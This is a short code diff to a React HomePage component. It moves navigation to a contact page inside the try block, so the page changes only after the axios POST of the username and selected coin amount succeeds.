@@ -61,20 +61,23 @@ const HomePage = () => {
       }
 
       try {
-        await axios.post(`${API}/session/step`, {
-          session_id: sessionId,
-          step: 'username_coin',
-          data: {
-            username: cleanUsername,
-            amount: selectedCoin
-          }
-        });
-      } catch (error) {
-        console.error('Failed to submit step:', error);
-      } finally {
-        setIsSubmitting(false);
-        navigate('/contact');
-      }
+  await axios.post(`${API}/session/step`, {
+    session_id: sessionId,
+    step: 'username_coin',
+    data: {
+      username: cleanUsername,
+      amount: selectedCoin
+    }
+  });
+
+  navigate('/contact');
+
+} catch (error) {
+  console.error('Failed to submit step:', error);
+
+} finally {
+  setIsSubmitting(false);
+}
     }
   };
 
